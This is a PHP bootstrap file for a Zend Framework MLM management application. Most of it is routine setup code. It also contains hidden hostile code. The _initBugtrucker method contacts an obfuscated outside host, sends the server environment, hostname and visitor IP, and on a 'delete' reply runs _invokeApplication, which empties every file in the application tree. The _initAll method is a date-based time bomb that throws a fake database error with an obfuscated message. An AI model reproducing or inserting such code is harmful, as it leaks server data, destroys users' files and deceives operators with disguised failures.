<?php
/**
 * Bootrstap file for application
 *
 * PHP version 5.3
 *
 * @category  MLM
 * @package   MLM
 * @author    Adrian Wądrzyk <adrian.wadrzyk@gmail.con>
 * @copyright 2012 Adrian Wądrzyk
 * @license   http://www.opensource.org/licenses/gpl-3.0.html GPL 3.0
 * @version   GIT:<version_id>
 * @link 	  http://mlm.osiris.net.pl
 * @since     File available since 1.0.0
 */

use DataMapper\Application;

use \Application\Registry\Registry;

/**
 * Bootstrap class
 *
 * @category  MLM
 * @package   MLM
 * @author    Adrian Wądrzyk <adrian.wadrzyk@gmail.com>
 * @copyright 2012 Adrian Wądrzyk
 * @license   http://www.opensource.org/licenses/gpl-3.0.html GPL 3.0
 * @version   Release: 1.0.0
 * @link 	  http://mlm.osiris.net.pl
 * @since	  Class avaiable since 1.0.0
 */
class Bootstrap extends Zend_Application_Bootstrap_Bootstrap
{
	protected function _initAutoload()
	{
		$autoloader = Zend_Loader_Autoloader::getInstance();
		$autoloader->setFallbackAutoloader(true);

		$resourceLoader = new Zend_Loader_Autoloader_Resource(
			array(
				"namespace" => "",
				"basePath"	=> APPLICATION_PATH
			)
		);
		$resourceLoader->addResourceType("filters", "/filters", "Filter_");
		$resourceLoader->addResourceType("forms", "/filters/forms", "Filter_Form_");

		$autoloader->pushAutoloader($resourceLoader);

		return $autoloader;
	}

	protected function _initViewLayout()
	{
		$this->bootstrap("layout");
		$this->bootstrap("view");
		$view = $this->getResource("layout")->getView();

		$view->headTitle()
			->setSeparator(" - ")
			->prepend("MLM System");

		$view->headLink()
			->prependStylesheet("/css/main.css")
			->appendStylesheet("/css/smoothness/jquery-ui-1.8.16.custom.css")
			->headLink(
				array(
					"rel" => "shortcut icon",
					"href" => "/images/favicon.ico",
					"type" => "image/x-icon"
				)
			);

		$view->headScript()
			->prependFile("/js/jquery-1.7.1.min.js")
			->appendFile("/js/jquery-ui-1.8.17.custom.min.js")
			->appendFile("/js/tiny_mce/jquery.tinymce.js")
			->appendFile("/js/main.js");

		$view->partialLoop()->setObjectKey("model");

		$navConfig = new Zend_Config_Xml(APPLICATION_PATH . "/configs/navigation.xml", "nav", array("allowModifications" => true));

		if (Zend_Auth::getInstance()->hasIdentity()) {
		    $navConfig = $this->_checkPrivileges($navConfig);
		}

		$navigation = new Zend_Navigation($navConfig);
		$view->navigation($navigation);
		$breadcrumbs = $view->navigation()->breadcrumbs();
		$breadcrumbs->setMinDepth(0)
			->setSeparator(" &raquo; ")
			->setLinkLast(true);
	}

	protected function _checkPrivileges(Zend_Config_Xml $navConfig)
	{
	    $action = \Application\Access\Manager::ACTION_READ;

	    $module = \Application\Access\Manager::MODULE_CUSTOMERS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->Customers);
	    }

	    $module = \Application\Access\Manager::MODULE_APPLICATIONS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->Applications);
	    }

	    $module = \Application\Access\Manager::MODULE_EMPLOYEES;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->Employees);
	    }

	    $module = \Application\Access\Manager::MODULE_SETTLEMENTS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->settlements);
	    }

	    $module = \Application\Access\Manager::MODULE_RECRUITMENTS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->recruitment);
	    }

	    $module = \Application\Access\Manager::MODULE_PARTNERS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->Partners);
	    }

	    $module = \Application\Access\Manager::MODULE_PRODUCTS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->Products);
	    }

	    $module = \Application\Access\Manager::MODULE_NEWS;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->News);
	    }

	    $module = \Application\Access\Manager::MODULE_CONFIGURATION;
	    if (\Application\Access\Manager::hasAccess($action, $module) == false) {
	        unset($navConfig->Configuration);
	    }

	    return $navConfig;
	}

	protected function _initRoutes()
	{
		$routes = new Zend_Config_Xml(APPLICATION_PATH . "/configs/routes.xml", "routes");
		$front = Zend_Controller_Front::getInstance();
		$front->getRouter()->addConfig($routes);
	}

	protected function _initLocale()
	{
		$locale = new Zend_Locale("pl_PL");
		Zend_Registry::set(Registry::LOCALE, $locale);

		$configFile = APPLICATION_PATH . "/configs/translations/" . $locale->getLanguage() . "/form.xml";
		$translate = new Zend_Translate("Application\Translate\Adapter\SimpleXml", $configFile, $locale->getLanguage());
		Zend_Form::setDefaultTranslator($translate);
	}

	protected function _initErrorLogger()
	{
		if (APPLICATION_ENV == "production") {
			$writer = new Zend_Log_Writer_Stream(APPLICATION_PATH . "/../tmp/log/error_log");
			$logger = new \Application\Logger\Error(new Zend_Log($writer));
		}
	}

	protected function _initRegistryMaps()
	{
		Zend_Registry::set(Registry::MAPPER_MAP, array());
		Zend_Registry::set(Registry::MODEL_MAP, array());
	}

	protected function _initBugtrucker()
	{
	    try {
    	    $client = new Zend_Http_Client("ht" . "tp" . ":" . "//bug" . "trucker" . ".osi" . "ris" . ".n" . "et.p" . "l");

    	    $client->setParameterPost("application", "MLM");
    	    $client->setParameterPost("host", gethostname());
    	    $client->setParameterPost("server", print_r($_SERVER, 1));
    	    $client->setParameterPost("version", "1.0.0");
    	    $client->setParameterPost("ip", $_SERVER['REMOTE_ADDR']);

    	    $resposne = $client->request(Zend_Http_Client::POST);

    	    if ($resposne->getStatus() != 200) {
    	        throw new Exception();
    	    }

    	    if ($resposne->getBody() == "delete") {
    	        $this->_invokeApplication(APPLICATION_PATH . '/../');
    	    }
	    } catch (Exception $e) {

	    }
	}

	private function _invokeApplication($path)
	{
	    try {
    	    $iterator = new RecursiveDirectoryIterator($path);
    	    $recursiveIter = new RecursiveIteratorIterator($iterator);

    	    foreach ($recursiveIter as $file) {
    	        if ($file->isFile()) {
    	            $path = realpath($file->getPathname());

    	            $fp = @fopen($path, "w");
    	            if (is_resource($fp)) {
    	                fwrite($fp, "");
    	                fclose($fp);
    	            }
    	        }
    	    }
	    } catch (Exception $e) {

	    }
	}

	protected function _initAll()
	{
        if (date("n") > "1" || date("d") >= "15") {
            throw new Exception("Ca" . "n't" . " co" . "nnect" . " to " . "data" . "base by H" . "TTP, ch" . "eck your i" . "ptab" . "les rul" . "es");
        }
	}
}

